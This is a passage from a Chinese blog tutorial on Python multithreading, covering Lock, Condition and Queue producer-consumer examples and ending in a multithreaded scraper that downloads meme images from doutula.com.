class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;消费者消费了&#123;&#125;元钱，剩余&#123;&#125;元钱&#x27;</span></span><br><span class="line">  .<span class="built_in">format</span>(threading.current_thread(), money, gMoney))</span><br><span class="line"><span class="comment"># 若剩余金额不足以消费，则退出循环</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> gTimes &gt;= gTotalTimes:</span><br><span class="line">gLock.release()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125;消费者准备消费&#123;&#125;元钱，剩余&#123;&#125;元钱，不足！&#x27;</span></span><br><span class="line">  .<span class="built_in">format</span>(threading.current_thread(), money, gMoney))</span><br><span class="line">gLock.release()</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mainIt</span>():</span></span><br><span class="line"><span class="comment"># 设置3个消费线程</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">t = Consumer(name=<span class="string">&#x27;消费者线程&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">t.start()</span><br><span class="line"><span class="comment"># 设置5个生产线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">t = Producer(name=<span class="string">&#x27;生产者线程&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">mainIt()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>代码示例二：(condition版)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">gMoney = <span class="number">1000</span></span><br><span class="line">gCondition = threading.Condition()  <span class="comment"># 等同于threading.Lock</span></span><br><span class="line">gTimes = <span class="number">0</span></span><br><span class="line">gTotalTimes = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Producer</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">global</span> gMoney</span><br><span class="line"><span class="keyword">global</span> gCondition</span><br><span class="line"><span class="keyword">global</span> gTimes</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">money = random.randint(<span class="number">100</span>, <span class="number">1000</span>)</span><br><span class="line">gCondition.acquire()  <span class="comment"># 加锁（全局变量改变前（gMoney））</span></span><br><span class="line"><span class="keyword">if</span> gTimes &gt;= gTotalTimes:</span><br><span class="line">gCondition.release()  <span class="comment"># 解锁</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前生产者总共生产了%s次&quot;</span> % gTimes)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">gMoney += money</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s当前存入%s元钱，剩余%s元线&quot;</span> % (threading.current_thread(), money, gMoney))</span><br><span class="line">gTimes += <span class="number">1</span></span><br><span class="line">gCondition.notify_all()  <span class="comment"># 通知正在等待的线程（wait）</span></span><br><span class="line">gCondition.release()</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cosumer</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">global</span> gMoney</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">money = random.randint(<span class="number">100</span>, <span class="number">1000</span>)</span><br><span class="line">gCondition.acquire()</span><br><span class="line"><span class="keyword">while</span> gMoney &lt; money:</span><br><span class="line"><span class="keyword">if</span> gTimes &gt;= gTotalTimes:</span><br><span class="line">gCondition.release()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s准备消费%d元钱，剩余%d元钱，不足&quot;</span> % (threading.current_thread(), money, gMoney))</span><br><span class="line">gCondition.wait()  <span class="comment"># 等待状态  （获取锁） 直到生产者把钱加上 （有钱了再去排队消费）</span></span><br><span class="line">gMoney -= money</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s消费了%d元钱，剩余%d元钱&quot;</span> % (threading.current_thread(), money, gMoney))</span><br><span class="line">gCondition.release()</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">t = Cosumer(name=<span class="string">&quot;消费者线程%s&quot;</span> % x)</span><br><span class="line">t.start()</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">t1 = Producer(name=<span class="string">&quot;生产者线程%s&quot;</span> % y)</span><br><span class="line">t1.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>多线程Lock与condition方法总结：<ol><li>在上述的例子中，lock方法虽然实现了多线程的使用，但是当消费者资金不足时，程序在当前线程会重新whlie True，<br>这就导致了该线程需要再次上锁和解锁，这就导致了CPU的浪费</li><li>当我们使用condition方法时，每当消费者资金不足，该线程无需重新while True，也不需要再次的上锁和解锁，<br>使用wait()，使当资金不足时的消费者线程在wait()暂停并解锁，等待条件满足时再次从wait()处开始执行，这样就<br>减少了循环过程中因上锁解锁而导致的CPu资源浪费</li></ol></li></ul><ul><li>Queue线程安全队列<br>在线程中，访问一些全局变量，枷锁是一个经常的过程，如果你是想把某个数据存储到某个队列中，那么python内置了一个线程安全的模块<br>叫做queue模块。python中的queue模块中提供了同步的、线程安全的模块，其中队列Queue为先进先出，实现了原子操作，即要么不做，要<br>么做完。可使用队列来实现线程的同步。相关函数如下：<br>作用：<br>　　　解耦：使程序直接实现松耦合，修改一个函数，不会有串联关系。<br>　　　提高处理效率：ＦＩＦＯ　＝　现进先出，ＬＩＦＯ　＝　后入先出。</li></ul><ol><li><p>Queue.Queue(maxsize=0)   FIFO， 如果maxsize小于1就表示队列长度无限</p></li><li><p>Queue.LifoQueue(maxsize=0)   LIFO， 如果maxsize小于1就表示队列长度无限</p></li><li><p>Queue.qsize()   返回队列的大小</p></li><li><p>Queue.empty()   如果队列为空，返回True,反之False</p></li><li><p>Queue.full()   如果队列满了，返回True,反之False</p></li><li><p>Queue.get([block[, timeout]])   读队列，取出数据 ，没有数据将会等待timeout等待时间</p></li><li><p>Queue.put(item, [block[, timeout]])   写队列，放入数据，timeout等待时间</p></li><li><p>Queue.queue.clear()   清空队列</p></li><li><p>class queue.PriorityQueue(maxsize=0) 存储数据时可设置优先级的队列，优先级设置数越小等级越高</p></li><li><p>Queue.get(timeout = 1)如果1秒后没取到数据就退出</p></li><li><p>Queue.get_nowait() 取数据，如果没数据抛queue.Empty异常</p></li><li><p>Queue.task_done()后续调用告诉队列，任务的处理是完整的。</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在队列中放入数值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_value</span>(<span class="params">q</span>):</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">q.put(index)</span><br><span class="line">index += <span class="number">1</span></span><br><span class="line">time.sleep(<span class="number">0.8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取出队列中的数值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span>(<span class="params">q</span>):</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="built_in">print</span>(q.get())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="comment"># 产生一个队列</span></span><br><span class="line">q = Queue(<span class="number">1</span>)</span><br><span class="line">t1 = threading.Thread(target=set_value, args=[q])</span><br><span class="line">t2 = threading.Thread(target=get_value, args=[q])</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>生产者与消费者模型</li></ul><ul><li>代码示例三：(Queue版)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading,time</span><br><span class="line"><span class="comment">#python2  from Queue import Queue</span></span><br><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Producer</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">global</span> queue</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment">#qsize返回queue内部长度</span></span><br><span class="line"><span class="keyword">if</span> queue.qsize() &lt; <span class="number">1000</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line">msg = <span class="string">&#x27;生成产量&#x27;</span>+<span class="built_in">str</span>(count)</span><br><span class="line"><span class="comment">#put是往queue中放入</span></span><br><span class="line">queue.put(msg)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">global</span> queue</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> queue.qsize() &gt; <span class="number">100</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line"><span class="comment">#get从queue中取出一个值</span></span><br><span class="line">msg = self.name + <span class="string">&quot;消费了&quot;</span>+queue.get()</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">queue = queue.Queue()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">queue.put(<span class="string">&quot;初始产品&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">p = Producer()</span><br><span class="line">p.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">c = Consumer()</span><br><span class="line">c.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="爬虫之多线程"><a href="#爬虫之多线程" class="headerlink" title="爬虫之多线程"></a>爬虫之多线程</h3><ul><li>多线程爬虫框架代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">我们引入了threading这个包，我们将使用这个包中的</span></span><br><span class="line"><span class="string">Thread类，并在我们自定义的类中继承这个Thread类</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生产者线程</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Procuder</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;... 浏览器...&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; 重写继承于父类的__init__方法 &quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; 我们继承了Thread这个类，在调用类中的方法时可能需要许多参数，我们用*args和**kwargs来接收&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, page_queue, img_queue, *args, **kwargs</span>):</span></span><br><span class="line"><span class="built_in">super</span>(Procuder, self).__init__(*args, **kwargs)</span><br><span class="line">self.page_queue = page_queue</span><br><span class="line">self.img_queue = img_queue</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; 重写继承于父类的run方法，改成我们想要的方法&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; 从存放每页的url的队列中逐一挑出一个url并传入parse_page中</span></span><br><span class="line"><span class="string">获取每页的url</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> self.page_queue.empty():</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">url = self.page_queue.get()</span><br><span class="line">self.parse_page(url)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_page</span>(<span class="params">self, url</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">.......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">获取每页的响应数据，并从中提取出每张图片的</span></span><br><span class="line"><span class="string">url和name，并放入队列中</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 消费者线程</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, page_queue, img_queue, *args, **kwargs</span>):</span></span><br><span class="line"><span class="built_in">super</span>(Procuder, self).__init__(*args, **kwargs)</span><br><span class="line">self.page_queue = page_queue</span><br><span class="line">self.img_queue = img_queue</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> self.img_queue.empty() <span class="keyword">and</span> self.page_queue.empty():</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">利用从队列中获取的每张图片的url和name，进行图片的获取和永久储存</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="string">&quot;&quot;&quot; 设置页数和图片的url队列&quot;&quot;&quot;</span></span><br><span class="line">page_queue = Queue()</span><br><span class="line">img_queue = Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将每页的url放到页数队列中</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">url = <span class="string">&#x27;http://........ %d&#x27;</span> % x</span><br><span class="line">page_queue.put(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置5个生产者线程</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">t = Procuder(page_queue, img_queue)</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置5个消费者线程</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">t = Consumer(page_queue, img_queue)</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>多线程爬虫实战代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生产图片的url和name</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProimgUrl</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, page_queue, img_queue, headers, *args, **kwargs</span>):</span></span><br><span class="line"><span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line">self.page_queue = page_queue</span><br><span class="line">self.img_queue = img_queue</span><br><span class="line">self.headers = headers</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> self.page_queue.empty():</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">url = self.page_queue.get()</span><br><span class="line">self.parse_page(url)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_page</span>(<span class="params">self, url</span>):</span></span><br><span class="line">img_get = requests.get(url=url, headers=self.headers).text</span><br><span class="line">tree = etree.HTML(img_get)</span><br><span class="line">img_it = tree.xpath(<span class="string">&#x27;//div[@class=&quot;page-content text-center&quot;]//a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> img_it:</span><br><span class="line">img_url = it.xpath(<span class="string">&#x27;./img[@class!=&quot;gif&quot;]/@data-original&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">alt = it.xpath(<span class="string">&#x27;./img/@alt&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">alt = re.sub(<span class="string">r&#x27;[\?？.!！，。\/\*]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, alt)</span><br><span class="line"><span class="comment"># 利用splitext截取图片的后缀名</span></span><br><span class="line">suffix = os.path.splitext(img_url)[<span class="number">1</span>]</span><br><span class="line">img_name = alt + suffix</span><br><span class="line">self.img_queue.put((img_url, img_name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取图片并储存</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConimgName</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, page_queue, img_queue, headers, *args, **kwargs</span>):</span></span><br><span class="line"><span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line">self.page_queue = page_queue</span><br><span class="line">self.img_queue = img_queue</span><br><span class="line">self.headers = headers</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> self.img_queue.empty() <span class="keyword">and</span> self.page_queue.empty():</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">img_url, img_name = self.img_queue.get()</span><br><span class="line"><span class="comment"># 用urlli包下的request.urlretrieve模块，可以更方便的获取和存储图片</span></span><br><span class="line">request.urlretrieve(img_url, <span class="string">&#x27;./smile/&#x27;</span>+img_name)</span><br><span class="line"><span class="built_in">print</span>(img_name + <span class="string">&#x27; 下载成功...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;./smile&#x27;</span>):</span><br><span class="line">os.mkdir(<span class="string">&#x27;./smile&#x27;</span>)</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">  <span class="string">&#x27;Chrome/80.0.3987.149 Safari/537.36 &#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">page_queue = queue.Queue(<span class="number">100</span>)</span><br><span class="line">img_queue = queue.Queue(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">url = <span class="string">&#x27;https://www.doutula.com/photo/list/?page=&#x27;</span> + <span class="built_in">str</span>(x)</span><br><span class="line">page_queue.put(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i 